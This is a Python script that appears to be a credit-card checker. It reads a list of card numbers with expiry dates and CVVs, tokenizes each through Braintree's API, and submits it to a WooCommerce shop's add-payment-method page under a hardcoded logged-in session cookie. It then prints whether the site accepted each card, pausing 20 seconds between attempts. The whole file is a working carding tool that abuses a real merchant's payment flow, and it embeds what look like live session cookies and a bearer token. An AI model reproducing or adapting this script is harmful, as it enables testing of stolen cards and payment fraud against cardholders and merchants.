import requests
import json
import time
cookies="sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2024-06-16%2019%3A05%3A04%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.bebebrands.com%2Fmy-account%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fwww.bebebrands.com%2Fwp-login.php%3Faction%3Dlogout%26redirect_to%3Dhttps%253A%252F%252Fwww.bebebrands.com%252Fmy-account%252F%26_wpnonce%3Deff144a8d6; sbjs_first_add=fd%3D2024-06-16%2019%3A05%3A04%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.bebebrands.com%2Fmy-account%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fwww.bebebrands.com%2Fwp-login.php%3Faction%3Dlogout%26redirect_to%3Dhttps%253A%252F%252Fwww.bebebrands.com%252Fmy-account%252F%26_wpnonce%3Deff144a8d6; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F124.0.0.0%20Mobile%20Safari%2F537.36; wordpress_logged_in_a69219699aff2e68eaf5b785dc26a5f8=hdvdhh%7C1719774323%7CryQyEJyCPwi3xGcVu8XyLyIY8Vs42tZK47se7tfDxgZ%7C4f9b11f5f046e84e745e34a3d4464a1abf7031b04d75416b3ae0f40cfb9aea9f; sbjs_session=pgs%3D5%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fwww.bebebrands.com%2Fmy-account%2Fedit-address%2Fbilling%2F"


url = "https://www.bebebrands.com/my-account/add-payment-method/"

headers = {
  'User-Agent': "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36",
  'Accept': "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
  'cache-control': "max-age=0",
  'upgrade-insecure-requests': "1",
  'sec-fetch-site': "same-origin",
  'sec-fetch-mode': "navigate",
  'sec-fetch-user': "?1",
  'sec-fetch-dest': "document",
  'sec-ch-ua': "\"Not-A.Brand\";v=\"99\", \"Chromium\";v=\"124\"",
  'sec-ch-ua-mobile': "?1",
  'sec-ch-ua-platform': "\"Android\"",
  'save-data': "on",
  'referer': "https://www.bebebrands.com/my-account/add-payment-method/",
  'accept-language': "ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7",
  'Cookie':cookies
}

response = requests.get(url, headers=headers)

nonce=response.text.split('name="woocommerce-add-payment-method-nonce" value=')[1].split('"')[1]
gg=input('enter cc combo: ')
g=open(gg,'r')
for g in g:
	c = g.strip().split('\n')[0]
	cc = c.split('|')[0]
	exp=c.split('|')[1]
	ex=c.split('|')[2]
	try:
	   exy=ex[2]+ex[3]
	   if '2' in ex[3] or '1' in ex[3]:
	   	exy=ex[2]+'7'
	   else:pass
	except:
	   exy=ex[0]+ex[1]
	   if '2' in ex[1] or '1' in ex[1]:
	   	exy=ex[0]+'7'
	   else:pass
	cvc=c.split('|')[3]
	url = "https://payments.braintree-api.com/graphql"
	
	payload = json.dumps({
	  "clientSdkMetadata": {
	    "source": "client",
	    "integration": "custom",
	    "sessionId": "aef665fe-9678-46a5-a003-50e10cd73fdf"
	  },
	  "query": "mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }",
	  "variables": {
	    "input": {
	      "creditCard": {
	        "number": cc,
	        "expirationMonth": exp,
	        "expirationYear": "20"+exy,
	        "cvv": cvc
	      },
	      "options": {
	        "validate": False
	      }
	    }
	  },
	  "operationName": "TokenizeCreditCard"
	})
	
	headers = {
	  'User-Agent': "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36",
	  'Content-Type': "application/json",
	  'sec-ch-ua': "\"Not-A.Brand\";v=\"99\", \"Chromium\";v=\"124\"",
	  'sec-ch-ua-mobile': "?1",
	  'authorization': "Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJFUzI1NiIsImtpZCI6IjIwMTgwNDI2MTYtcHJvZHVjdGlvbiIsImlzcyI6Imh0dHBzOi8vYXBpLmJyYWludHJlZWdhdGV3YXkuY29tIn0.eyJleHAiOjE3MTg2NDk5NTEsImp0aSI6IjQ3ODc0MmViLWI3NjUtNDJhMS04ZDhkLTQyMThmNDJmNDQ3MCIsInN1YiI6InBoMjJjOWJyNXZncWR3aGQiLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6InBoMjJjOWJyNXZncWR3aGQiLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0Ijp0cnVlfSwicmlnaHRzIjpbIm1hbmFnZV92YXVsdCJdLCJzY29wZSI6WyJCcmFpbnRyZWU6VmF1bHQiXSwib3B0aW9ucyI6e319.lA0euw9Nf404NlLBDqRDcAFeusJ5eMyalXhZrlf8ePz6nh3-qkYLAd30NUObJBE969vY0H5hXnjPkUbHEaAbrA",
	  'braintree-version': "2018-05-10",
	  'save-data': "on",
	  'sec-ch-ua-platform': "\"Android\"",
	  'origin': "https://assets.braintreegateway.com",
	  'sec-fetch-site': "cross-site",
	  'sec-fetch-mode': "cors",
	  'sec-fetch-dest': "empty",
	  'referer': "https://assets.braintreegateway.com/",
	  'accept-language': "ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7"
	}
	
	response = requests.post(url, data=payload, headers=headers)
	
	tokencc=response.json()['data']['tokenizeCreditCard']['token']
	url = "https://www.bebebrands.com/my-account/add-payment-method/"
	
	payload = f"payment_method=braintree_credit_card&wc-braintree-credit-card-card-type=visa&wc-braintree-credit-card-3d-secure-enabled=&wc-braintree-credit-card-3d-secure-verified=&wc-braintree-credit-card-3d-secure-order-total=0.00&wc_braintree_credit_card_payment_nonce={tokencc}&wc_braintree_device_data=%7B%22correlation_id%22%3A%22cdb2121604a00ca1d61cf6b9fc16937a%22%7D&wc-braintree-credit-card-tokenize-payment-method=true&wc_braintree_paypal_payment_nonce=&wc_braintree_device_data=%7B%22correlation_id%22%3A%22cdb2121604a00ca1d61cf6b9fc16937a%22%7D&wc-braintree-paypal-context=shortcode&wc_braintree_paypal_amount=0.00&wc_braintree_paypal_currency=GBP&wc_braintree_paypal_locale=en_gb&wc-braintree-paypal-tokenize-payment-method=true&woocommerce-add-payment-method-nonce={nonce}&_wp_http_referer=%2Fmy-account%2Fadd-payment-method%2F&woocommerce_add_payment_method=1"
	
	headers = {
	  'User-Agent': "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36",
	  'Accept': "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
	  'Content-Type': "application/x-www-form-urlencoded",
	  'cache-control': "max-age=0",
	  'sec-ch-ua': "\"Not-A.Brand\";v=\"99\", \"Chromium\";v=\"124\"",
	  'sec-ch-ua-mobile': "?1",
	  'sec-ch-ua-platform': "\"Android\"",
	  'save-data': "on",
	  'upgrade-insecure-requests': "1",
	  'origin': "https://www.bebebrands.com",
	  'sec-fetch-site': "same-origin",
	  'sec-fetch-mode': "navigate",
	  'sec-fetch-user': "?1",
	  'sec-fetch-dest': "document",
	  'referer': "https://www.bebebrands.com/my-account/add-payment-method/",
	  'accept-language': "ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7",
	  'Cookie': cookies
	}
	
	response = requests.post(url, data=payload, headers=headers)
	
	
	url = "https://www.bebebrands.com/my-account/add-payment-method/"
	
	headers = {
	  'User-Agent': "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36",
	  'Accept': "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
	  'cache-control': "max-age=0",
	  'upgrade-insecure-requests': "1",
	  'sec-fetch-site': "same-origin",
	  'sec-fetch-mode': "navigate",
	  'sec-fetch-user': "?1",
	  'sec-fetch-dest': "document",
	  'sec-ch-ua': "\"Not-A.Brand\";v=\"99\", \"Chromium\";v=\"124\"",
	  'sec-ch-ua-mobile': "?1",
	  'sec-ch-ua-platform': "\"Android\"",
	  'save-data': "on",
	  'referer': "https://www.bebebrands.com/my-account/add-payment-method/",
	  'accept-language': "ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7",
	  'Cookie': cookies
	}
	
	response = requests.get(url, headers=headers)
	
	print(c+'|'+response.text.split('Status code')[1].split('<')[0])
	time.sleep(20)